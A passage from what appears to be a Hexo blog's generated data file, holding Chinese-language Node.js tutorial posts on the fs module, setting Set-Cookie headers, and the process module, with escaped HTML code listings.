return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    console.log(&apos;写入成功&apos;);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">//5.fs.readFile 读取文件  </span><br><span class=\"line\">fs.readFile(&apos;123.txt&apos;,function(error,data)&#123;</span><br><span class=\"line\">    if(error)&#123;</span><br><span class=\"line\">        console.log(error);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    //console.log(data);  //data是读取的十六进制的数据。  也可以在参数中加入编码格式&quot;utf8&quot;来解决十六进制的问题;</span><br><span class=\"line\">    console.log(data.toString());  //读取出所有行的信息  </span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">//6.fs.readdir 读取目录下第一级内容  把目录下面的文件和文件夹都获取到。  </span><br><span class=\"line\">fs.readdir(&apos;html&apos;,function(error,data)&#123;</span><br><span class=\"line\">    if(error)&#123;</span><br><span class=\"line\">        console.log(error);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    console.log(data);  //data是数组类型，包含文件夹以及文件的名字(只有第一级目录内容)。拿到一个文件夹下面的所有目录  </span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">//7.fs.rename 重命名  1.改名  2.剪切文件(移动)  </span><br><span class=\"line\">fs.rename(&apos;html/index.html&apos;,&apos;html/news.html&apos;,function(error)&#123;</span><br><span class=\"line\">    if(error)&#123;</span><br><span class=\"line\">        console.log(error);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    console.log(&apos;修改名字成功&apos;);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">//8. fs.rmdir  删除目录   rmdir 这个方法只能删除目录，不能删除文件  </span><br><span class=\"line\">fs.rmdir(&apos;abc目录&apos;,function(error)&#123;</span><br><span class=\"line\">    if(error)&#123;</span><br><span class=\"line\">        console.log(error);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    console.log(&apos;删除目录成功&apos;);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">//9. fs.unlink删除文件  </span><br><span class=\"line\">fs.unlink(&apos;index.txt&apos;,function(error)&#123;</span><br><span class=\"line\">    if(error)&#123;</span><br><span class=\"line\">        console.log(error);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    console.log(&apos;删除文件成功&apos;);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">//10. fs.createReadStream  从文件流中读取数据，读取的文件比较大时建议用流的方式读取，文件比较大会多次读取。  </span><br><span class=\"line\">var fileReadStream = fs.createReadStream( &apos;data1.json&apos;);</span><br><span class=\"line\">var str = &apos;&apos;;</span><br><span class=\"line\">fileReadStream.on(&apos;data&apos;, (data) =&gt; &#123;</span><br><span class=\"line\">    console.log(&quot;接收到&quot; + data.length);   //文件比较大时，会多次读取，多次执行该回调函数  </span><br><span class=\"line\">str += data;</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\">fileReadStream.on(&apos;end&apos;, () =&gt; &#123;</span><br><span class=\"line\">    console.log(&quot; --- 结束 ---&quot;);</span><br><span class=\"line\">console.log( str );</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\">fileReadStream.on(&apos;error&apos;, (error) =&gt; &#123;</span><br><span class=\"line\">    console.log(error)</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">//11. fs.createWriteStream  写入文件流  </span><br><span class=\"line\">var fs = require(&quot;fs&quot;);</span><br><span class=\"line\">var data  = &quot;我是从数据库获取的数据，我要保存起来&quot;;</span><br><span class=\"line\">var writerStream = fs.createWriteStream(&apos;output.txt&apos;);</span><br><span class=\"line\">writerStream.write( data , &apos;UTF8&apos; );</span><br><span class=\"line\">writerStream.end();  //标记文件末尾  结束写入流，释放资源  </span><br><span class=\"line\">writerStream.on( &apos;finish&apos;,  function() &#123;</span><br><span class=\"line\">    console.log(&quot;写入完成。&quot;);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">writerStream.on( &apos;error&apos;,  function(error)&#123;</span><br><span class=\"line\">    console.log(error.stack);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">console.log(&quot;程序执行完毕&quot;);</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">//12. pipe 管道流  </span><br><span class=\"line\">var fs = require(&quot;fs&quot;);</span><br><span class=\"line\">var readerStream = fs.createReadStream( &apos;input.txt&apos;);</span><br><span class=\"line\">var writerStream = fs.createWriteStream( &apos;output.txt&apos;);</span><br><span class=\"line\">readerStream.pipe( writerStream );</span><br><span class=\"line\">console.log(&quot;程序执行完毕&quot;);</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">//13. fs.access 判断目录、文件是否存在(读写权限)</span><br><span class=\"line\">var  fs = require(&apos;fs&apos;);</span><br><span class=\"line\">fs.access(&apos;package.json&apos;,(err)=&gt;&#123;</span><br><span class=\"line\">    console.log(err ?  &apos;目录/文件不存在&apos;: &apos;文件存在,可以进行读写&apos;);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<hr>\n<h2 id=\"FS-文件系统\"><a href=\"#FS-文件系统\" class=\"headerlink\" title=\"FS-文件系统\"></a><a href=\"http://nodejs.cn/api/fs.html#fs_file_system\" target=\"_blank\" rel=\"noopener\">FS-文件系统</a></h2><p>fs 模块提供了一些 API，用于以一种类似标准 POSIX 函数的方式与文件系统进行交互。</p>\n<p><strong>所有的文件系统操作都有异步和同步两种形式。</strong></p>\n<p><code>异步</code>形式的 <strong>最后一个<code>参数</code>都是完成时<code>回调函数</code></strong>。 传给回调函数的参数取决于具体方法，但<code>回调函数的第一个参数都会保留给异常</code>。 如果操作成功完成，则第一个参数会是 null 或 undefined。</p>\n<p><strong>同步操作</strong></p>\n<p>当使用<code>同步操作</code>时，任何异常都会被立即抛出，可以使用 <code>try/catch</code> 来处理异常，或让异常向上冒泡。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const fs = require(&apos;fs&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">try &#123;</span><br><span class=\"line\">  fs.unlinkSync(&apos;/tmp/hello&apos;);</span><br><span class=\"line\">  console.log(&apos;successfully deleted /tmp/hello&apos;);</span><br><span class=\"line\">&#125; catch (err) &#123;</span><br><span class=\"line\">  // handle the error</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>异步操作</strong></p>\n<p>注意，异步的方法不能保证执行顺序。 所以下面的例子可能会出错，因为 fs.stat() 操作可能在 fs.rename() 操作之前完成。</p>\n<p><strong>建议</strong></p>\n<p>在繁忙的进程中，建议使用函数的异步版本。 同步的方法会阻塞整个进程，直到完成（停止所有连接）。</p>\n<h3 id=\"文件路径\"><a href=\"#文件路径\" class=\"headerlink\" title=\"文件路径\"></a>文件路径</h3><p>大部分 <code>fs</code> 操作接受<code>字符串</code>、<code>Buffer</code>、或使用 <code>file:</code> 协议的 <code>URL</code> 对象作为文件路径。</p>\n<p><code>相对路径</code> 会相对于 <code>process.cwd()</code> 定义的当前工作目录进行处理。</p>\n<p>使用 <code>Buffer</code> 定义的路径主要用于将文件路径处理为 opaque 字节序列的特定 POSIX 操作系统。 在这种系统上，一个文件路径可能包含使用多种字符编码的子序列。 与字符串路径一样，Buffer 路径也可以是相对的或绝对的。</p>\n<p><strong>注意</strong> 在 Windows 上 Node.js 遵循 per-drive 工作目录的理念。 当使用驱动器路径不带反斜杠时可以观察到该特性。 例如，fs.readdirSync(‘c:\\‘) 可能会返回与 fs.readdirSync(‘c:’) 不同的结果。 详见 <a href=\"\">MSDN路径文档</a></p>\n<h4 id=\"支持-URL-对象\"><a href=\"#支持-URL-对象\" class=\"headerlink\" title=\"支持 URL 对象\"></a>支持 URL 对象</h4><h3 id=\"文件描述符\"><a href=\"#文件描述符\" class=\"headerlink\" title=\"文件描述符\"></a><strong>文件描述符</strong></h3><p>在 <code>POSIX</code> 系统，<code>内核</code>为<code>所有进程</code>维护着一张当前打开着的<code>文件与资源表格</code>。 每个打开的文件都会分配一个名为<code>文件描述符</code>的数值标识。</p>\n<p>在<code>系统层</code>，所有<code>文件系统操作</code>使用这些<code>文件描述符</code>来识别与追踪每个特定的文件。 </p>\n<p>Window 系统使用了一个<code>不同但概念类似</code>的机制来追踪资源。 </p>\n<p>为方便用户，<code>Node.js 抽象了不同操作系统间的差异</code>，为所有打开的文件分配了数值的文件描述符。</p>\n<p><code>fs.open()</code> 方法用于分配一个新的文件描述符。 一旦分配了，文件描述符可用于<code>读取</code>数据、<code>写入</code>数据、或<code>查看</code>文件信息。</p>\n<p><code>大多数操作系统</code>会<code>限制打开的文件描述符的数量</code>，所以当<code>操作完成时需关闭描述符</code>。 如果不这样做会导致<code>内存泄漏</code>，最终造成应用奔溃。</p>\n<h3 id=\"线程池的使用\"><a href=\"#线程池的使用\" class=\"headerlink\" title=\"线程池的使用\"></a>线程池的使用</h3><p>注意，所有文件系统 API 中，除了 <code>fs.FSWatcher()</code> 和那些显式同步的方法之外，都使用了 <code>libuv</code> 的线程池，这对于某些应用程序可能会产生出乎意料问题和负面的性能影响，详见 <a href=\"http://nodejs.cn/api/cli.html#cli_uv_threadpool_size_size\" target=\"_blank\" rel=\"noopener\"><code>UV_THREADPOOL_SIZE</code></a> 文档。</p>\n<h1 id=\"fs-FSWatcher-类\"><a href=\"#fs-FSWatcher-类\" class=\"headerlink\" title=\"fs.FSWatcher 类\"></a>fs.FSWatcher 类</h1><p>成功调用 <code>fs.watch()</code> 方法会返回一个新的 <code>fs.FSWatcher</code> 对象。</p>\n<p>所有 <code>fs.FSWatcher</code> 对象都是 <a href=\"http://nodejs.cn/api/events.html\" target=\"_blank\" rel=\"noopener\"><code>EventEmitter</code></a> 的，每当监视的文件被修改时会触发 <code>&#39;change&#39;</code> 事件。</p>\n<h2 id=\"‘change’-事件\"><a href=\"#‘change’-事件\" class=\"headerlink\" title=\"‘change’ 事件\"></a>‘change’ 事件</h2><ul>\n<li><code>eventType</code> \\<string> 发生的变化事件的类型。</string></li>\n<li><code>filename</code> \\<string> | \\<buffer> 变化的文件名（如果是相关的或有效的）。</buffer></string></li>\n</ul>\n<p>当被监视的目录或文件有变化时触发。 详见 <code>fs.watch()</code></p>\n<h2 id=\"‘close’-事件\"><a href=\"#‘close’-事件\" class=\"headerlink\" title=\"‘close’ 事件\"></a>‘close’ 事件</h2><p>当 <code>watcher</code> 停止监视文件变化时触发。 关闭的 <code>fs.FSWatcher</code> 对象在事件处理函数中不再可用。</p>\n<h2 id=\"‘error’-事件\"><a href=\"#‘error’-事件\" class=\"headerlink\" title=\"‘error’ 事件\"></a>‘error’ 事件</h2><p>当监视文件发生错误时触发。 </p>\n<p>发生错误的 <code>fs.FSWatcher</code> 对象在事件处理函数中<code>不再可用</code>。</p>\n<h2 id=\"watcher-close\"><a href=\"#watcher-close\" class=\"headerlink\" title=\"watcher.close()\"></a>watcher.close()</h2><p><code>fs.FSWatcher</code> <code>停止监视</code>文件的变化。 </p>\n<p>一旦停止，<code>fs.FSWatcher</code> 对象将<code>不再可用</code>。</p>\n<h1 id=\"fs-ReadStream-类\"><a href=\"#fs-ReadStream-类\" class=\"headerlink\" title=\"fs.ReadStream 类\"></a>fs.ReadStream 类</h1><p>成功调用 <code>fs.createReadStream()</code> 会返回一个新的 <code>fs.ReadStream</code> 对象。</p>\n<p><code>fs.ReadStream</code> 对象都是可读流。</p>\n<h2 id=\"‘close’-事件-1\"><a href=\"#‘close’-事件-1\" class=\"headerlink\" title=\"‘close’ 事件\"></a>‘close’ 事件</h2><p>当 <code>fs.ReadStream</code> 底层的文件描述符被关闭时触发。</p>\n<h2 id=\"‘open’-事件\"><a href=\"#‘open’-事件\" class=\"headerlink\" title=\"‘open’ 事件\"></a>‘open’ 事件</h2><h2 id=\"‘ready’-事件\"><a href=\"#‘ready’-事件\" class=\"headerlink\" title=\"‘ready’ 事件\"></a>‘ready’ 事件</h2><h2 id=\"readStream-bytesRead\"><a href=\"#readStream-bytesRead\" class=\"headerlink\" title=\"readStream.bytesRead\"></a>readStream.bytesRead</h2><p>已读取的字节数。</p>\n<h2 id=\"readStream-path\"><a href=\"#readStream-path\" class=\"headerlink\" title=\"readStream.path\"></a>readStream.path</h2><h1 id=\"fs-Stats-类\"><a href=\"#fs-Stats-类\" class=\"headerlink\" title=\"fs.Stats 类\"></a>fs.Stats 类</h1><p><code>fs.Stats</code> 对象提供了一个文件的信息。</p>\n<h2 id=\"stats-isBlockDevice\"><a href=\"#stats-isBlockDevice\" class=\"headerlink\" title=\"stats.isBlockDevice()\"></a>stats.isBlockDevice()</h2><p>如果 <code>fs.Stats</code> 对象表示一个块设备，则返回 true 。</p>\n<h2 id=\"stats-isCharacterDevice\"><a href=\"#stats-isCharacterDevice\" class=\"headerlink\" title=\"stats.isCharacterDevice()\"></a>stats.isCharacterDevice()</h2><p>如果 <code>fs.Stats</code> 对象表示一个字符设备，则返回 true 。</p>\n<h2 id=\"stats-isDirectory\"><a href=\"#stats-isDirectory\" class=\"headerlink\" title=\"stats.isDirectory()\"></a>stats.isDirectory()</h2><p>如果 <code>fs.Stats</code> 对象表示一个文件系统目录，则返回 true 。</p>\n<h2 id=\"stats-isFIFO\"><a href=\"#stats-isFIFO\" class=\"headerlink\" title=\"stats.isFIFO()\"></a>stats.isFIFO()</h2><p>如果 <code>fs.Stats</code> 对象表示一个<code>先进先出 (FIFO) 管道</code>，则返回 true 。</p>\n<p>FIFO( First Input First Output)简单说就是指先进先出。<a href=\"https://baike.baidu.com/item/FIFO存储器/4530258?fr=aladdin\" target=\"_blank\" rel=\"noopener\">百度百科: FIFO存储器</a></p>\n<h2 id=\"stats-isFile\"><a href=\"#stats-isFile\" class=\"headerlink\" title=\"stats.isFile()\"></a>stats.isFile()</h2><p>如果 <code>fs.Stats</code> 对象表示一个普通文件，则返回 <code>true</code> 。</p>\n<h2 id=\"stats-isSocket\"><a href=\"#stats-isSocket\" class=\"headerlink\" title=\"stats.isSocket()\"></a>stats.isSocket()</h2><p>如果 <code>fs.Stats</code> 对象表示一个 <code>socket</code>，则返回 <code>true</code> 。</p>\n<h2 id=\"stats-isSymbolicLink\"><a href=\"#stats-isSymbolicLink\" class=\"headerlink\" title=\"stats.isSymbolicLink()\"></a>stats.isSymbolicLink()</h2><p>如果 <code>fs.Stats</code> 对象表示一个符号链接，则返回 <code>true</code> 。</p>\n<p>该方法只在使用 <code>fs.lstat()</code> 时有效。</p>\n<h2 id=\"stats属性\"><a href=\"#stats属性\" class=\"headerlink\" title=\"stats属性\"></a>stats属性</h2><table>\n<thead>\n<tr>\n<th style=\"text-align:center\">type</th>\n<th style=\"text-align:left\">description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">stats.dev</td>\n<td style=\"text-align:left\">包含文件的设备的数值型标识。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">stats.ino</td>\n<td style=\"text-align:left\">文件系统特定的文件索引节点数值。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">stats.mode</td>\n<td style=\"text-align:left\">表示文件类型与模式的位域。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">stats.nlink</td>\n<td style=\"text-align:left\">文件的硬链接数量。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">stats.uid</td>\n<td style=\"text-align:left\">文件拥有者的数值型用户标识。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">stats.gid</td>\n<td style=\"text-align:left\">拥有文件的群组的数值型群组标识。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">stats.rdev</td>\n<td style=\"text-align:left\">如果文件是一个特殊文件，则返回数值型的设备标识。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">stats.size</td>\n<td style=\"text-align:left\">文件的字节大小。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">stats.blksize</td>\n<td style=\"text-align:left\">文件系统用于 I/O 操作的块大小。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">stats.blocks</td>\n<td style=\"text-align:left\">分配给文件的块的数量。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">stats.atimeMs</td>\n<td style=\"text-align:left\">表示文件最后一次被<code>访问</code>的时间戳。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">stats.mtimeMs</td>\n<td style=\"text-align:left\">表示文件最后一次被<code>修改</code>的时间戳。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">stats.ctimeMs</td>\n<td style=\"text-align:left\">表示文件<code>状态最后一次被改变</code>的时间戳。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">stats.birthtimeMs</td>\n<td style=\"text-align:left\">表示文件的<code>创建时间戳</code>。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">stats.atime</td>\n<td style=\"text-align:left\">表示文件<code>最后一次被访问</code>的时间。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">stats.mtime</td>\n<td style=\"text-align:left\">表示文件<code>最后一次被修改</code>的时间。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">stats.ctime</td>\n<td style=\"text-align:left\">表示文件<code>状态最后一次被改变</code>的时间。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">stats.birthtime</td>\n<td style=\"text-align:left\">表示文件的<code>创建</code>时间。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"></td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"Stat-时间的值\"><a href=\"#Stat-时间的值\" class=\"headerlink\" title=\"Stat 时间的值\"></a>Stat 时间的值</h2><p>略</p>\n<h1 id=\"fs-WriteStream-类\"><a href=\"#fs-WriteStream-类\" class=\"headerlink\" title=\"fs.WriteStream 类\"></a>fs.WriteStream 类</h1>"},{"title":"node.js Set-Cookie header属性","date":"2018-07-27T07:21:18.000Z","_content":"## Node设置Cookie\n### 读取cookie\ncookie的读取很简单，通过`req.headers.cookie`就能取到，是一个类似\"a=1;b=2\"的字符串，手动分割一下就行。\n\n### 设置cookie\n> `res.setHeader(\"Set-Cookie\",\"a=1\")`\n\n### 设置多个附加属性\n\n> `res.setHeader(\"Set-Cookie\",\"a=1;max-age=86400;HttpOnly\")`\n\n### 设置多个值 \n\n> `res.setHeader(\"Set-Cookie\",[\"a=1;max-age=86400\",\"b=2;max-age=3600\"])`\n\n\n## Node设置多个Cookie\n````\nres.setHeader(\"Set-Cookie\", ['a=000', 't=1111', 'w=2222']);\n\n// HTTP response `writeHead`对象\nres.writeHead(200, [\n    ['Set-Cookie', 'mycookie1=value1'],\n    ['Set-Cookie', 'mycookie2=value2']\n]);\n\nres.setHeader('Set-Cookie', [ 'mycookie1=value1',  'mycookie2=value2']);\n````","source":"_posts/programmingLanguage/NodeJS/Node-js-Set-Cookie-header.md","raw":"---\ntitle: node.js Set-Cookie header属性\ndate: 2018-07-27 15:21:18\ntags: Set-Cookie\ncategories: Set-Cookie\n---\n## Node设置Cookie\n### 读取cookie\ncookie的读取很简单，通过`req.headers.cookie`就能取到，是一个类似\"a=1;b=2\"的字符串，手动分割一下就行。\n\n### 设置cookie\n> `res.setHeader(\"Set-Cookie\",\"a=1\")`\n\n### 设置多个附加属性\n\n> `res.setHeader(\"Set-Cookie\",\"a=1;max-age=86400;HttpOnly\")`\n\n### 设置多个值 \n\n> `res.setHeader(\"Set-Cookie\",[\"a=1;max-age=86400\",\"b=2;max-age=3600\"])`\n\n\n## Node设置多个Cookie\n````\nres.setHeader(\"Set-Cookie\", ['a=000', 't=1111', 'w=2222']);\n\n// HTTP response `writeHead`对象\nres.writeHead(200, [\n    ['Set-Cookie', 'mycookie1=value1'],\n    ['Set-Cookie', 'mycookie2=value2']\n]);\n\nres.setHeader('Set-Cookie', [ 'mycookie1=value1',  'mycookie2=value2']);\n````","slug":"programmingLanguage/NodeJS/Node-js-Set-Cookie-header","published":1,"updated":"2018-09-05T06:33:18.495Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry0p00bezodvj6qp41m2","content":"<h2 id=\"Node设置Cookie\"><a href=\"#Node设置Cookie\" class=\"headerlink\" title=\"Node设置Cookie\"></a>Node设置Cookie</h2><h3 id=\"读取cookie\"><a href=\"#读取cookie\" class=\"headerlink\" title=\"读取cookie\"></a>读取cookie</h3><p>cookie的读取很简单，通过<code>req.headers.cookie</code>就能取到，是一个类似”a=1;b=2”的字符串，手动分割一下就行。</p>\n<h3 id=\"设置cookie\"><a href=\"#设置cookie\" class=\"headerlink\" title=\"设置cookie\"></a>设置cookie</h3><blockquote>\n<p><code>res.setHeader(&quot;Set-Cookie&quot;,&quot;a=1&quot;)</code></p>\n</blockquote>\n<h3 id=\"设置多个附加属性\"><a href=\"#设置多个附加属性\" class=\"headerlink\" title=\"设置多个附加属性\"></a>设置多个附加属性</h3><blockquote>\n<p><code>res.setHeader(&quot;Set-Cookie&quot;,&quot;a=1;max-age=86400;HttpOnly&quot;)</code></p>\n</blockquote>\n<h3 id=\"设置多个值\"><a href=\"#设置多个值\" class=\"headerlink\" title=\"设置多个值\"></a>设置多个值</h3><blockquote>\n<p><code>res.setHeader(&quot;Set-Cookie&quot;,[&quot;a=1;max-age=86400&quot;,&quot;b=2;max-age=3600&quot;])</code></p>\n</blockquote>\n<h2 id=\"Node设置多个Cookie\"><a href=\"#Node设置多个Cookie\" class=\"headerlink\" title=\"Node设置多个Cookie\"></a>Node设置多个Cookie</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">res.setHeader(&quot;Set-Cookie&quot;, [&apos;a=000&apos;, &apos;t=1111&apos;, &apos;w=2222&apos;]);</span><br><span class=\"line\"></span><br><span class=\"line\">// HTTP response `writeHead`对象</span><br><span class=\"line\">res.writeHead(200, [</span><br><span class=\"line\">    [&apos;Set-Cookie&apos;, &apos;mycookie1=value1&apos;],</span><br><span class=\"line\">    [&apos;Set-Cookie&apos;, &apos;mycookie2=value2&apos;]</span><br><span class=\"line\">]);</span><br><span class=\"line\"></span><br><span class=\"line\">res.setHeader(&apos;Set-Cookie&apos;, [ &apos;mycookie1=value1&apos;,  &apos;mycookie2=value2&apos;]);</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Node设置Cookie\"><a href=\"#Node设置Cookie\" class=\"headerlink\" title=\"Node设置Cookie\"></a>Node设置Cookie</h2><h3 id=\"读取cookie\"><a href=\"#读取cookie\" class=\"headerlink\" title=\"读取cookie\"></a>读取cookie</h3><p>cookie的读取很简单，通过<code>req.headers.cookie</code>就能取到，是一个类似”a=1;b=2”的字符串，手动分割一下就行。</p>\n<h3 id=\"设置cookie\"><a href=\"#设置cookie\" class=\"headerlink\" title=\"设置cookie\"></a>设置cookie</h3><blockquote>\n<p><code>res.setHeader(&quot;Set-Cookie&quot;,&quot;a=1&quot;)</code></p>\n</blockquote>\n<h3 id=\"设置多个附加属性\"><a href=\"#设置多个附加属性\" class=\"headerlink\" title=\"设置多个附加属性\"></a>设置多个附加属性</h3><blockquote>\n<p><code>res.setHeader(&quot;Set-Cookie&quot;,&quot;a=1;max-age=86400;HttpOnly&quot;)</code></p>\n</blockquote>\n<h3 id=\"设置多个值\"><a href=\"#设置多个值\" class=\"headerlink\" title=\"设置多个值\"></a>设置多个值</h3><blockquote>\n<p><code>res.setHeader(&quot;Set-Cookie&quot;,[&quot;a=1;max-age=86400&quot;,&quot;b=2;max-age=3600&quot;])</code></p>\n</blockquote>\n<h2 id=\"Node设置多个Cookie\"><a href=\"#Node设置多个Cookie\" class=\"headerlink\" title=\"Node设置多个Cookie\"></a>Node设置多个Cookie</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">res.setHeader(&quot;Set-Cookie&quot;, [&apos;a=000&apos;, &apos;t=1111&apos;, &apos;w=2222&apos;]);</span><br><span class=\"line\"></span><br><span class=\"line\">// HTTP response `writeHead`对象</span><br><span class=\"line\">res.writeHead(200, [</span><br><span class=\"line\">    [&apos;Set-Cookie&apos;, &apos;mycookie1=value1&apos;],</span><br><span class=\"line\">    [&apos;Set-Cookie&apos;, &apos;mycookie2=value2&apos;]</span><br><span class=\"line\">]);</span><br><span class=\"line\"></span><br><span class=\"line\">res.setHeader(&apos;Set-Cookie&apos;, [ &apos;mycookie1=value1&apos;,  &apos;mycookie2=value2&apos;]);</span><br></pre></td></tr></table></figure>"},{"title":"Node.js--process模块","date":"2018-05-10T01:37:05.000Z","_content":"## [转][Node.js的process模块](http://www.css88.com/archives/4548)\n\n`process`模块用来与`当前进程互动`，可以 `通过全局变量process` 访问，不必使用require命令加载。它是一个`EventEmitter`对象的实例。\n\n### 一、属性\nprocess对象提供一系列属性，用于返回系统信息。\n\n+ process.pid：当前进程的进程号。\n\n+ process.version：Node的版本，比如v0.10.18。\n\n+ process.platform：当前系统平台，比如Linux。\n\n+ process.title：默认值为“node”，可以自定义该值。\n\n+ process.argv：当前进程的命令行参数数组。\n\n+ process.env：指向当前`shell`的环境变量，比如`process.env.HOME`。\n\n+ process.execPath：运行当前进程的可执行文件的绝对路径。\n\n+ process.stdout：指向标准输出。\n\n+ process.stdin：指向标准输入。\n\n+ process.stderr：指向标准错误。\n\n#### 主要属性介绍\n**1. stdout**\\\n`process.stdout`用来控制标准输出，也就是在命令行窗口向用户显示内容。它的write方法等同于console.log。\n````\nexports.log = function() {\n    process.stdout.write(format.apply(this, arguments) + '\\n');\n};\n````\n\n**2. argv**\n\n`process.argv` 返回`命令行脚本`的 各个参数 组成的数组。\n\n先新建一个脚本文件 argv.js。\n````\n// argv.js\n \nconsole.log(\"argv: \",process.argv);\nconsole.log(\"argc: \",process.argc);\n````\n\n在命令行下调用这个脚本，会得到以下结果。\n````\n> node argv.js a b c\n\n# [ 'node', '/path/to/argv.js', 'a', 'b', 'c' ]\n````\n\n上面代码表示，argv返回数组的成员依次是命令行的各个部分。要得到真正的参数部分，可以把argv.js改写成下面这样。\n````\n// argv.js\n \nvar myArgs = process.argv.slice(2);\nconsole.log(myArgs);\n````\n\n### 二、方法\n\n`process`对象提供以下方法：\n\n+ `process.exit()`：退出当前进程。\n+ `process.cwd()`：返回运行当前脚本的工作目录的路径。_\n+ `process.chdir()`：改变工作目录。\n+ `process.nextTick()`：将一个回调函数放在下次事件循环的顶部。\n\n**1. `process.chdir()` 改变工作目录的例子:**\n````\nprocess.cwd()\n# '/home/aaa'\n \nprocess.chdir('/home/bbb')\n \nprocess.cwd()\n# '/home/bbb'\n````\n\n**2. `process.nextTick()` 指定下次事件循环首先运行的任务:**\n````\nprocess.nextTick(function () {\n    console.log('Next event loop!');\n});\n````\n\n上面代码可以用`setTimeout`改写，但是`nextTick`的`效率`更高、`描述`更准确。\n````\nsetTimeout(function () {\n    console.log('Next event loop!');\n}, 0)\n````\n\n### 三、事件\n**1. exit事件**\n\n`当前进程退出`时，会触发`exit事件`，可以对该事件指定`回调函数`。\n\n这是一个用来 `定时检查模块状态` 的好`钩子(hook)`(例如单元测试), 当主事件循环在执行完`'exit'`的回调函数后将不再执行,所以在`exit事件`中定义的定时器可能不会被加入事件列表.\n````\nprocess.on('exit', function () {\n    fs.writeFileSync('/tmp/myfile', 'This MUST be saved on exit.');\n});\n````\n\n**2. uncaughtException事件**\n\n当前`进程抛出`一个没有被捕捉的意外时，会触发uncaughtException事件。\n\n````\nprocess.on('uncaughtException', function (err) {\n    console.error('An uncaught error occurred!');\n    console.error(err.stack);\n});\n````\n\n-----------------\n[阅读原文](http://www.css88.com/archives/4548)","source":"_posts/programmingLanguage/NodeJS/Node-js-process模块.md","raw":"---\ntitle: Node.js--process模块\ndate: 2018-05-10 09:37:05\ntags: process\ncategories: Node\n---\n## [转][Node.js的process模块](http://www.css88.com/archives/4548)\n\n`process`模块用来与`当前进程互动`，可以 `通过全局变量process` 访问，不必使用require命令加载。它是一个`EventEmitter`对象的实例。\n\n### 一、属性\nprocess对象提供一系列属性，用于返回系统信息。\n\n+ process.pid：当前进程的进程号。\n\n+ process.version：Node的版本，比如v0.10.18。\n\n+ process.platform：当前系统平台，比如Linux。\n\n+ process.title：默认值为“node”，可以自定义该值。\n\n+ process.argv：当前进程的命令行参数数组。\n\n+ process.env：指向当前`shell`的环境变量，比如`process.env.HOME`。\n\n+ process.execPath：运行当前进程的可执行文件的绝对路径。\n\n+ process.stdout：指向标准输出。\n\n+ process.stdin：指向标准输入。\n\n+ process.stderr：指向标准错误。\n\n#### 主要属性介绍\n**1. 